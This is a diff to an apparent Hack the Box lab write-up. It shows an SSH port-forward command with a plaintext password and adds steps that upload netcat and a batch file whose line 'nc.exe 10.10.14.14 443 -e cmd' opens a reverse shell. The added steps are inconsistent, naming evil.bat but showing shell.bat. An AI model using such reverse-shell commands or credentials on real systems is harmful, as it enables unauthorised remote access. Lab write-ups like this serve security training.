@@ -307,7 +307,7 @@ Blocked, need to come from `127.0.0.1`. The allowed hosts mentioned in the `nscl
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/34915dc4-7c2a-4cd3-b4c1-899944325ae9)
 
 Port Forwarding
-```
+```CSS
 sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3167437b-77ec-47d7-956b-e5471153bc3d)
@@ -316,3 +316,11 @@ sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
 Enable Modules
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/27791269-4c10-4b6f-be21-17c48da712b2)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/aed9ad00-3992-42ab-9981-9c441794fab8)
+
+- Upload nc.exe and evil.bat to `C:\temp` to target from attacking machine
+
+Contents of `shell.bat`
+```CSS
+@echo off
+\programdata\nc.exe 10.10.14.14 443 -e cmd
+```
